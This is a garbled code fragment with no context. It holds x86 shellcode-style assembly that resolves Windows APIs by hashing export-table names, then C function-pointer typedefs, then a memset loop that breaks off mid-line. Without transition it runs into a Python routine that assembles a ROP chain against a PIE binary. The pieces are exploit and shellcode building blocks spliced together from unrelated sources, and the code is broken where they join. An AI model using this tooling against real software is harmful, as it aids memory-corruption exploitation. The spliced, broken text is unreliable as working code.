    pop eax
    push eax
    add ebx, eax
    mov ecx, [ebx+28]
    mov edx, [ebx+32]
    mov ebx, [ebx+36]
    add ecx, eax
    add edx, eax
    add ebx, eax
    find_procedure:
    mov esi, [edx]
    pop eax
    push eax
    add esi, eax
    push 1
    push [ebp+12]
    push esi
    call hashit
    test eax, eax
    jz found_procedure
    add edx, 4
    add ebx, 2
    jmp find_procedure
    found_procedure:
    pop eax
    xor edx, edx
    mov dx, [ebx]
    shl edx, 2
    add ecx, edx
    add eax, [ecx]
    pop ecx
    pop edi
    pop esi
    pop ebx
    mov esp, ebp
    pop ebp
    ret 0x08
    hashit:
    push ebp
    mov ebp, esp
    push ecx
    push ebx
    push edx
    xor ecx,ecx
    xor ebx,ebx
    xor edx,edx
    mov eax, [ebp+0x08]
    hashloop:
    mov dl, [eax]
    or dl, 0x60
    add ebx, edx
    shl ebx, 0x01
    add eax, [ebp+16]
    mov cl, [eax]
    test cl, cl
    loopnz hashloop
    xor eax, eax
    mov ecx, [ebp+12]
    cmp ebx, ecx
    jz donehash
    inc eax
    donehash:
    pop edx
    pop ebx
    pop ecx
    mov esp, ebp
    pop ebp
    ret 12
    totheend:
    }
    *pfLoadLibraryA = fLoadLibraryA;
    *pfGetProcAddressA = fGetProcAddressA;
    }
    typedef int (WINAPI *pMessageBoxA)(HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType);
    typedef FILE* (__cdecl *pfopen)(const char * path,const char * mode);
    typedef size_t (__cdecl * pfread)( void *buffer, size_t size, size_t count, FILE *stream);
    typedef int (__cdecl * pfseek)(FILE *stream, long offset, int fromwhere);
    typedef long int (__cdecl *pftell)( FILE * stream );
    typedef int (__cdecl * pfclose)(FILE *stream);
    typedef void* (__cdecl * pmalloc)(size_t size);
    void fmemset(void *dest, char ch, int size)
    {
    int i;
    for (i = 0; i  0:
            rop_data += l32(p_ret[len(args)] + pie_text_base)
        for arg in args:
            rop_data += l32(arg)
        return rop_data